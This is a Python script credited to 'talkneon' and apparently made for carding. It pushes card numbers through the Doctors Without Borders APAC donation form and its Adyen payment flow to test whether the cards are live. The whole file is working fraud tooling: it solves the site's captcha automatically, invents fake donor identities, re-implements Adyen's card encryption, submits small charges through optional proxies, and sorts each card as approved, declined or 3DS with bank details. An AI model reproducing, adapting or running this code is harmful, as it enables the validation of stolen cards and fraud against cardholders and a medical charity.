# ============================================================
#  MSF Donation Gate (Adyen Sessions) — /ctxt
#  Doctors Without Borders APAC donation form
#  Provider: Adyen (Sessions flow)
#  made by talkneon
# ============================================================

import requests
import re
import json
import time
import random
import string
import os
import base64
import logging
import hashlib
import struct
from datetime import datetime, timezone

logging.getLogger("requests").setLevel(logging.ERROR)
logging.getLogger("urllib3").setLevel(logging.ERROR)

# ============================================================
#  Constants
# ============================================================
SITE_URL = "https://doctorswithoutborders-apac.org"
DONATE_PATH = "/en/donate"
DONATE_URL = f"{SITE_URL}{DONATE_PATH}"
FORM_ID = "webform_submission_donations_adyen_node_2732_add_form"

# Default params — user can change amount via settings
DEFAULT_CURRENCY_SYMBOL = "US$"
DEFAULT_AMOUNT = "1"
DEFAULT_FREQUENCY = "give_once"

# Adyen checkoutshopper base — the site uses 'live-au' for live
ADYEN_CS_BASE_LIVE = "https://checkoutshopper-live-au.adyen.com/checkoutshopper"
ADYEN_CS_BASE_TEST = "https://checkoutshopper-test.adyen.com/checkoutshopper"

# BIN lookup cache
_bin_cache = {}
_bin_lock = __import__('threading').Lock()

# ============================================================
#  BIN lookup
# ============================================================
def _get_bin_info(bin6):
    with _bin_lock:
        if bin6 in _bin_cache:
            return _bin_cache[bin6]
    try:
        r = requests.get(f"https://api.voidex.dev/api/bin?bin={bin6}", timeout=5)
        if r.ok:
            d = r.json()
            info = {
                "brand": d.get("brand", d.get("scheme", "Unknown")),
                "type": d.get("type", "Unknown"),
                "bank": d.get("bank", {}).get("name", "Unknown") if isinstance(d.get("bank"), dict) else d.get("bank", "Unknown"),
                "country": d.get("country", {}).get("name", "Unknown") if isinstance(d.get("country"), dict) else "Unknown",
                "emoji": d.get("country", {}).get("emoji", "") if isinstance(d.get("country"), dict) else "",
            }
            with _bin_lock:
                _bin_cache[bin6] = info
            return info
    except Exception:
        pass
    return {"brand": "Unknown", "type": "Unknown", "bank": "Unknown", "country": "Unknown", "emoji": ""}


# ============================================================
#  Adyen CSE (Client-Side Encryption) in pure Python
#  Format: adyenjs_0_1_25$base64(rsa_enc_key)$base64(nonce)$base64(ciphertext+tag)
# ============================================================

def _pkcs1_oaep_encrypt(public_key_der, plaintext):
    """RSA-OAEP SHA-1 encryption using pure Python with openssl subprocess fallback."""
    try:
        from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.backends import default_backend

        pub_key = serialization.load_der_public_key(public_key_der, backend=default_backend())
        return pub_key.encrypt(
            plaintext,
            asym_padding.OAEP(
                mgf=asym_padding.MGF1(algorithm=hashes.SHA1()),
                algorithm=hashes.SHA1(),
                label=None
            )
        )
    except ImportError:
        pass

    # Fallback: use subprocess openssl
    import subprocess, tempfile
    with tempfile.NamedTemporaryFile(suffix='.der', delete=False) as f:
        f.write(public_key_der)
        pubkey_file = f.name
    with tempfile.NamedTemporaryFile(suffix='.pem', delete=False) as f:
        pem_file = f.name

    try:
        subprocess.run(['openssl', 'rsa', '-pubin', '-inform', 'DER', '-in', pubkey_file, '-outform', 'PEM', '-out', pem_file], check=True, capture_output=True)
        proc = subprocess.run(['openssl', 'rsautl', '-encrypt', '-oaep', '-pubin', '-inkey', pem_file], input=plaintext, capture_output=True, check=True)
        return proc.stdout
    finally:
        os.unlink(pubkey_file)
        os.unlink(pem_file)


def _build_rsa_pubkey_der(modulus_hex, exponent_hex="10001"):
    """Build DER-encoded RSA public key from hex modulus and exponent."""
    mod_bytes = bytes.fromhex(modulus_hex)
    exp_bytes = bytes.fromhex(exponent_hex)

    # Ensure positive (leading zero if high bit set)
    if mod_bytes[0] & 0x80:
        mod_bytes = b'\x00' + mod_bytes
    if exp_bytes[0] & 0x80:
        exp_bytes = b'\x00' + exp_bytes

    def _asn1_len(length):
        if length < 0x80:
            return bytes([length])
        elif length < 0x100:
            return bytes([0x81, length])
        else:
            return bytes([0x82, (length >> 8) & 0xff, length & 0xff])

    def _asn1_integer(data):
        return b'\x02' + _asn1_len(len(data)) + data

    def _asn1_sequence(data):
        return b'\x30' + _asn1_len(len(data)) + data

    def _asn1_bitstring(data):
        bs = b'\x00' + data  # unused bits = 0
        return b'\x03' + _asn1_len(len(bs)) + bs

    # RSA public key: SEQUENCE { INTEGER modulus, INTEGER exponent }
    rsa_key = _asn1_sequence(_asn1_integer(mod_bytes) + _asn1_integer(exp_bytes))

    # AlgorithmIdentifier for RSA: OID 1.2.840.113549.1.1.1 + NULL
    alg_id = _asn1_sequence(
        b'\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01'  # OID
        + b'\x05\x00'  # NULL
    )

    # SubjectPublicKeyInfo
    spki = _asn1_sequence(alg_id + _asn1_bitstring(rsa_key))
    return spki


def _aes_ccm_encrypt(key, nonce, plaintext, tag_length=8):
    """AES-256-CCM encryption."""
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESCCM
        aesccm = AESCCM(key, tag_length=tag_length)
        ct = aesccm.encrypt(nonce, plaintext, None)
        return ct  # ciphertext + tag appended
    except ImportError:
        pass

    # Fallback: try pycryptodome
    try:
        from Crypto.Cipher import AES
        cipher = AES.new(key, AES.MODE_CCM, nonce=nonce, mac_len=tag_length)
        ct, tag = cipher.encrypt_and_digest(plaintext)
        return ct + tag
    except ImportError:
        raise ImportError("Need 'cryptography' or 'pycryptodome' for AES-CCM")


def _adyen_encrypt_field(field_name, value, adyen_public_key, generation_time=None):
    """
    Encrypt a single card field using Adyen CSE format.
    adyen_public_key format: "exponent|modulus" (hex)
    Returns: "adyenjs_0_1_25$base64(rsa_enc)$base64(nonce)$base64(ct+tag)"
    """
    if generation_time is None:
        generation_time = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z")

    # Build plaintext JSON
    payload = json.dumps({field_name: str(value), "generationtime": generation_time}, separators=(',', ':'))
    plaintext = payload.encode('utf-8')

    # Parse public key
    parts = adyen_public_key.split('|')
    if len(parts) != 2:
        raise ValueError(f"Invalid Adyen public key format: expected 'exponent|modulus'")
    exponent_hex, modulus_hex = parts[0], parts[1]

    # Generate AES key + nonce
    aes_key = os.urandom(32)  # 256-bit
    nonce = os.urandom(12)    # 96-bit for CCM

    # AES-CCM encrypt
    ciphertext_tag = _aes_ccm_encrypt(aes_key, nonce, plaintext, tag_length=8)

    # RSA-OAEP encrypt the AES key
    pubkey_der = _build_rsa_pubkey_der(modulus_hex, exponent_hex)
    encrypted_key = _pkcs1_oaep_encrypt(pubkey_der, aes_key)

    # Format
    enc_key_b64 = base64.b64encode(encrypted_key).decode('ascii')
    nonce_b64 = base64.b64encode(nonce).decode('ascii')
    ct_b64 = base64.b64encode(ciphertext_tag).decode('ascii')

    return f"adyenjs_0_1_25${enc_key_b64}${nonce_b64}${ct_b64}"


# ============================================================
#  Random identity generator
# ============================================================
FIRST_NAMES = ["James", "Mary", "John", "Patricia", "Robert", "Jennifer", "Michael", "Linda", "David", "Sarah"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Davis", "Miller", "Wilson", "Moore", "Taylor"]
COUNTRIES = [
    ("US", "United States", "+1"),
    ("AU", "Australia", "+61"),
    ("SG", "Singapore", "+65"),
    ("MY", "Malaysia", "+60"),
]


def _random_identity():
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    rand_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    email = f"{first.lower()}.{last.lower()}.{rand_str}@gmail.com"
    country = random.choice(COUNTRIES)
    phone = ''.join([str(random.randint(0, 9)) for _ in range(10)])
    return {
        "first_name": first,
        "last_name": last,
        "email": email,
        "country_code": country[0],
        "country_name": country[1],
        "phone_prefix": country[2],
        "phone": phone,
    }


# ============================================================
#  Drupal form navigation
# ============================================================

def _extract_form_tokens(html):
    """Extract form_build_id, form_token, form_id from Drupal webform HTML."""
    tokens = {}
    m = re.search(r'name="form_build_id"\s+value="([^"]+)"', html)
    if m:
        tokens['form_build_id'] = m.group(1)
    m = re.search(r'name="form_token"\s+value="([^"]+)"', html)
    if m:
        tokens['form_token'] = m.group(1)
    m = re.search(r'name="form_id"\s+value="([^"]+)"', html)
    if m:
        tokens['form_id'] = m.group(1)
    return tokens


def _solve_math_captcha(html):
    """Extract and solve the math captcha (e.g., '2 + 0 = ')."""
    # Pattern: digit + digit =  OR  digit - digit =
    m = re.search(r'(\d+)\s*\+\s*(\d+)\s*=', html)
    if m:
        return str(int(m.group(1)) + int(m.group(2)))
    m = re.search(r'(\d+)\s*-\s*(\d+)\s*=', html)
    if m:
        return str(int(m.group(1)) - int(m.group(2)))
    m = re.search(r'(\d+)\s*\*\s*(\d+)\s*=', html)
    if m:
        return str(int(m.group(1)) * int(m.group(2)))
    return None


def _extract_math_field_name(html):
    """Extract the captcha field name."""
    m = re.search(r'name="(captcha_response[^"]*)"', html)
    if m:
        return m.group(1)
    m = re.search(r'name="(math[^"]*)"', html)
    if m:
        return m.group(1)
    # Drupal webform captcha: look for input near "Math question"
    m = re.search(r'Math question.*?<input[^>]+name="([^"]+)"', html, re.DOTALL)
    if m:
        return m.group(1)
    return None


def _extract_captcha_sid(html):
    """Extract captcha_sid and captcha_token."""
    result = {}
    m = re.search(r'name="captcha_sid"\s+value="([^"]+)"', html)
    if m:
        result['captcha_sid'] = m.group(1)
    m = re.search(r'name="captcha_token"\s+value="([^"]+)"', html)
    if m:
        result['captcha_token'] = m.group(1)
    return result


def _extract_wizard_button(html, target_page):
    """Extract the wizard navigation button name and value."""
    # Look for: <input ... data-webform-wizard-page="2" ... name="op" value="Donate now">
    pattern = rf'data-webform-wizard-page="{target_page}"[^>]*name="([^"]+)"\s+value="([^"]+)"'
    m = re.search(pattern, html)
    if m:
        return m.group(1), m.group(2)
    # Fallback: look for name="op" near the wizard page attribute
    pattern2 = rf'name="([^"]+)"\s+value="([^"]+)"[^>]*data-webform-wizard-page="{target_page}"'
    m = re.search(pattern2, html)
    if m:
        return m.group(1), m.group(2)
    return None, None


def _extract_currency_amount_field(html, currency_symbol):
    """Get the correct donation_amount field name for the selected currency."""
    # Map currency symbols to field suffixes
    symbol_to_suffix = {
        "US$": "usd", "A$": "aud", "S$": "sgd", "RM": "myr",
        "฿": "thb", "₱": "php", "Rp": "idr", "B$": "bnd",
        "CN¥": "cny", "HK$": "hkd", "₹": "inr", "JP¥": "jpy",
        "₩": "krw", "Rs": "lkr", "MOP$": "mop", "NZ$": "nzd",
        "NT$": "twd", "₫": "vnd",
    }
    suffix = symbol_to_suffix.get(currency_symbol, "usd")
    return f"donation_amount_{suffix}"


def _extract_adyen_session(html):
    """Extract Adyen session data from step 3's data-adyen attribute."""
    m = re.search(r'data-adyen=["\']({.*?})["\']', html, re.DOTALL)
    if m:
        try:
            return json.loads(m.group(1))
        except json.JSONDecodeError:
            pass
    # Try HTML-encoded
    m = re.search(r'data-adyen="([^"]+)"', html)
    if m:
        try:
            decoded = m.group(1).replace('&quot;', '"').replace('&amp;', '&').replace('&#039;', "'")
            return json.loads(decoded)
        except json.JSONDecodeError:
            pass
    return None


def _extract_adyen_client_key(html):
    """Extract the Adyen client key from drupalSettings."""
    m = re.search(r'"adyen_client_key"\s*:\s*"([^"]+)"', html)
    if m:
        return m.group(1)
    return None


def _extract_adyen_environment(html):
    """Extract the Adyen environment from drupalSettings."""
    m = re.search(r'"adyen_environment"\s*:\s*"([^"]+)"', html)
    if m:
        return m.group(1)
    return None


def _extract_form_data(html):
    """Extract the form data from data-form attribute."""
    m = re.search(r'data-form="([^"]+)"', html)
    if m:
        try:
            decoded = m.group(1).replace('&quot;', '"').replace('&amp;', '&')
            return json.loads(decoded)
        except json.JSONDecodeError:
            pass
    return None


# ============================================================
#  Session headers
# ============================================================
def _get_headers(referer=None):
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    h = {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }
    if referer:
        h["Referer"] = referer
    return h


# ============================================================
#  Core flow: navigate form → get Adyen session → submit payment
# ============================================================

def _process_card(cc, mm, yy, cvv, proxy_dict=None, amount=None, currency=None):
    """
    Full check flow:
    1. GET donation page → extract tokens, math captcha
    2. POST step 1 → select amount/currency
    3. POST step 2 → fill personal details
    4. Extract Adyen session from step 3
    5. Call Adyen checkoutshopper setup → get public key
    6. Encrypt card, submit payment
    7. Return result
    """
    amount = amount or DEFAULT_AMOUNT
    currency = currency or DEFAULT_CURRENCY_SYMBOL
    start_time = time.time()

    session = requests.Session()
    if proxy_dict:
        session.proxies.update(proxy_dict)

    try:
        # ---- Step 1: GET the donation page ----
        params = {
            "appeal": "PSWM-MYEN-Generic",
            "donation_currency": currency,
            "page": "3"
        }
        r1 = session.get(DONATE_URL, params=params, headers=_get_headers(), timeout=30)
        if r1.status_code != 200:
            return {"status": "error", "response": f"Page load failed ({r1.status_code})"}

        html1 = r1.text
        tokens = _extract_form_tokens(html1)
        if not tokens.get('form_build_id'):
            return {"status": "error", "response": "Could not extract form tokens"}

        # Solve math captcha
        captcha_answer = _solve_math_captcha(html1)
        captcha_field = _extract_math_field_name(html1)
        captcha_extras = _extract_captcha_sid(html1)

        # Get wizard button for step 2
        btn_name, btn_value = _extract_wizard_button(html1, "2")
        if not btn_name:
            btn_name, btn_value = "op", "Donate now"

        # Build amount field
        amount_field = _extract_currency_amount_field(html1, currency)

        # ---- POST Step 1: Amount selection ----
        step1_data = {
            "donation_frequency": DEFAULT_FREQUENCY,
            "donation_currency": currency,
            f"{amount_field}[radios]": amount,
            "donate_towards": "Medical humanitarian projects around the world",
            "form_build_id": tokens['form_build_id'],
            "form_token": tokens.get('form_token', ''),
            "form_id": tokens.get('form_id', FORM_ID),
            btn_name: btn_value,
        }

        # Add captcha if present
        if captcha_answer and captcha_field:
            step1_data[captcha_field] = captcha_answer
        if captcha_extras:
            step1_data.update(captcha_extras)

        r2 = session.post(
            r1.url,
            data=step1_data,
            headers=_get_headers(referer=r1.url),
            timeout=30,
            allow_redirects=True
        )

        if r2.status_code != 200:
            return {"status": "error", "response": f"Step 1 failed ({r2.status_code})"}

        html2 = r2.text

        # Check if we're on step 2
        if 'Your details' not in html2 and 'first_name' not in html2:
            # Maybe captcha failed, try extracting new captcha
            captcha_answer2 = _solve_math_captcha(html2)
            if captcha_answer2:
                tokens2 = _extract_form_tokens(html2)
                captcha_field2 = _extract_math_field_name(html2)
                captcha_extras2 = _extract_captcha_sid(html2)
                step1_data.update(tokens2)
                if captcha_field2:
                    step1_data[captcha_field2] = captcha_answer2
                if captcha_extras2:
                    step1_data.update(captcha_extras2)
                r2 = session.post(r2.url, data=step1_data, headers=_get_headers(referer=r2.url), timeout=30, allow_redirects=True)
                html2 = r2.text

        # ---- POST Step 2: Personal details ----
        tokens2 = _extract_form_tokens(html2)
        if not tokens2.get('form_build_id'):
            tokens2 = tokens  # fallback

        identity = _random_identity()
        btn2_name, btn2_value = _extract_wizard_button(html2, "3")
        if not btn2_name:
            btn2_name, btn2_value = "op", "Continue to payment"

        step2_data = {
            "email": identity["email"],
            "title": "Mr",
            "first_name": identity["first_name"],
            "last_name": identity["last_name"],
            "country": identity["country_code"],
            "phone": identity["phone"],
            "optin_checkbox": "1",
            "form_build_id": tokens2.get('form_build_id', tokens.get('form_build_id', '')),
            "form_token": tokens2.get('form_token', tokens.get('form_token', '')),
            "form_id": tokens2.get('form_id', tokens.get('form_id', FORM_ID)),
            btn2_name: btn2_value,
        }

        r3 = session.post(
            r2.url,
            data=step2_data,
            headers=_get_headers(referer=r2.url),
            timeout=30,
            allow_redirects=True
        )

        if r3.status_code != 200:
            return {"status": "error", "response": f"Step 2 failed ({r3.status_code})"}

        html3 = r3.text

        # ---- Extract Adyen session data from Step 3 ----
        adyen_data = _extract_adyen_session(html3)
        if not adyen_data:
            # Check for error message
            if 'Antibot verification failed' in html3:
                return {"status": "error", "response": "Antibot verification failed"}
            return {"status": "error", "response": "Could not extract Adyen session from payment page"}

        session_id = adyen_data.get("id")
        session_data = adyen_data.get("sessionData")

        if not session_id or not session_data:
            return {"status": "error", "response": "Incomplete Adyen session data"}

        # Get client key and environment from page
        client_key = _extract_adyen_client_key(html3)
        if not client_key:
            client_key = _extract_adyen_client_key(html1)  # try from step 1

        adyen_env = _extract_adyen_environment(html3)
        if not adyen_env:
            adyen_env = _extract_adyen_environment(html1)

        if not client_key:
            return {"status": "error", "response": "Could not find Adyen client key"}

        # Determine checkoutshopper base URL
        if adyen_env and adyen_env == "live":
            cs_base = ADYEN_CS_BASE_LIVE
        elif adyen_env and adyen_env == "test":
            cs_base = ADYEN_CS_BASE_TEST
        else:
            cs_base = ADYEN_CS_BASE_LIVE  # default live

        # ---- Call Adyen checkoutshopper setup ----
        setup_url = f"{cs_base}/v1/sessions/{session_id}/setup"
        setup_payload = {
            "sessionData": session_data,
            "channel": "Web",
        }
        setup_headers = {
            "Content-Type": "application/json",
            "X-Clientkey": client_key,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Origin": SITE_URL,
            "Referer": f"{SITE_URL}/",
        }

        r_setup = session.post(setup_url, json=setup_payload, headers=setup_headers, timeout=30)
        if r_setup.status_code != 200:
            return {"status": "error", "response": f"Adyen setup failed ({r_setup.status_code})"}

        setup_resp = r_setup.json()
        public_key = setup_resp.get("configuration", {}).get("cardComponent", {}).get("publicKey")
        if not public_key:
            public_key = setup_resp.get("publicKey")
        if not public_key:
            # Try to find in nested config
            for key in ["configuration", "paymentMethodsConfiguration"]:
                if key in setup_resp:
                    config = setup_resp[key]
                    if isinstance(config, dict):
                        for k, v in config.items():
                            if isinstance(v, dict) and "publicKey" in v:
                                public_key = v["publicKey"]
                                break
                if public_key:
                    break

        if not public_key:
            return {"status": "error", "response": "Could not extract Adyen public key from setup"}

        # ---- Encrypt card data ----
        gen_time = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z")

        try:
            enc_number = _adyen_encrypt_field("number", cc, public_key, gen_time)
            enc_month = _adyen_encrypt_field("expiryMonth", mm.zfill(2), public_key, gen_time)
            enc_year = _adyen_encrypt_field("expiryYear", yy if len(yy) == 4 else f"20{yy}", public_key, gen_time)
            enc_cvv = _adyen_encrypt_field("cvc", cvv, public_key, gen_time)
        except Exception as e:
            return {"status": "error", "response": f"Card encryption failed: {str(e)}"}

        # ---- Submit payment ----
        payments_url = f"{cs_base}/v1/sessions/{session_id}/payments"
        payment_payload = {
            "sessionData": session_data,
            "paymentMethod": {
                "type": "scheme",
                "encryptedCardNumber": enc_number,
                "encryptedExpiryMonth": enc_month,
                "encryptedExpiryYear": enc_year,
                "encryptedSecurityCode": enc_cvv,
                "holderName": f"{identity['first_name']} {identity['last_name']}",
            },
            "browserInfo": {
                "acceptHeader": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "colorDepth": 24,
                "language": "en-US",
                "javaEnabled": False,
                "screenHeight": 1080,
                "screenWidth": 1920,
                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                "timeZoneOffset": -480,
            },
            "channel": "Web",
            "origin": SITE_URL,
            "returnUrl": f"{DONATE_URL}?page=3",
        }

        pay_headers = {
            "Content-Type": "application/json",
            "X-Clientkey": client_key,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Origin": SITE_URL,
            "Referer": f"{SITE_URL}/",
        }

        r_pay = session.post(payments_url, json=payment_payload, headers=pay_headers, timeout=30)
        elapsed = round(time.time() - start_time, 1)

        if r_pay.status_code != 200:
            return {"status": "error", "response": f"Payment request failed ({r_pay.status_code})", "time": elapsed}

        pay_resp = r_pay.json()
        result_code = pay_resp.get("resultCode", "Unknown")
        refusal_reason = pay_resp.get("refusalReason", "")
        action = pay_resp.get("action")

        # Map result
        if result_code == "Authorised":
            status = "approved"
            response = f"Authorised"
        elif result_code == "Refused":
            status = "declined"
            response = refusal_reason or "Refused"
        elif result_code in ("RedirectShopper", "IdentifyShopper", "ChallengeShopper"):
            status = "3ds"
            response = f"3D Secure ({result_code})"
        elif result_code == "Pending" or result_code == "Received":
            status = "approved"
            response = result_code
        elif result_code == "Error":
            status = "error"
            response = refusal_reason or pay_resp.get("message", "Payment error")
        else:
            status = "declined"
            response = result_code

        return {
            "status": status,
            "response": response,
            "result_code": result_code,
            "time": elapsed,
            "refusal_reason": refusal_reason,
        }

    except requests.exceptions.ProxyError:
        return {"status": "retry", "response": "Proxy error"}
    except requests.exceptions.ConnectionError:
        return {"status": "retry", "response": "Connection error"}
    except requests.exceptions.Timeout:
        return {"status": "retry", "response": "Timeout"}
    except Exception as e:
        return {"status": "error", "response": str(e)}


# ============================================================
#  Public API
# ============================================================

def check_card(cc_line, proxy_dict=None, amount=None, currency=None):
    """
    Check a card using the MSF Adyen donation gate.
    cc_line: "CC|MM|YY|CVV"
    Returns formatted result string.
    """
    parts = cc_line.strip().replace(" ", "").split("|")
    if len(parts) < 4:
        return "Error | Invalid format — use CC|MM|YY|CVV"

    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    cc = re.sub(r'\D', '', cc)
    mm = mm.zfill(2)
    if len(yy) == 4:
        yy_short = yy[2:]
    else:
        yy_short = yy
        yy = f"20{yy}"

    result = _process_card(cc, mm, yy_short, cvv, proxy_dict, amount=amount, currency=currency)

    masked = f"{cc[:6]}{'x' * (len(cc) - 10)}{cc[-4:]}" if len(cc) > 10 else cc
    bin6 = cc[:6]
    bin_info = _get_bin_info(bin6)
    elapsed = result.get("time", 0)

    status = result["status"]
    response = result["response"]

    if status == "approved":
        status_emoji = "✅"
        status_label = "APPROVED"
    elif status == "3ds":
        status_emoji = "🔒"
        status_label = "3D SECURE"
    elif status == "declined":
        status_emoji = "❌"
        status_label = "DECLINED"
    elif status == "retry":
        status_emoji = "🔄"
        status_label = "RETRY"
    else:
        status_emoji = "⚠️"
        status_label = "ERROR"

    line = (
        f"{status_emoji} {status_label} — {response}\n"
        f"Card: <code>{masked}</code>\n"
        f"Gateway: Adyen Sessions\n"
        f"Merchant: MSF Donation\n"
        f"BIN: {bin_info['brand']} - {bin_info['type']} - {bin_info['bank']}\n"
        f"Country: {bin_info['emoji']} {bin_info['country']}\n"
        f"Time: {elapsed}s"
    )
    return line


def probe_site():
    """Health check for the MSF donation gate."""
    try:
        r = requests.get(DONATE_URL, timeout=15, params={"appeal": "PSWM-MYEN-Generic"})
        if r.status_code == 200 and "adyen" in r.text.lower():
            # Extract client key to verify config
            client_key = _extract_adyen_client_key(r.text)
            if client_key:
                return True, f"Adyen gate online (key: {client_key[:12]}...)"
            return True, "Adyen form found but client key not on this page"
        elif r.status_code == 200:
            return False, "Page loaded but Adyen not detected"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, str(e)
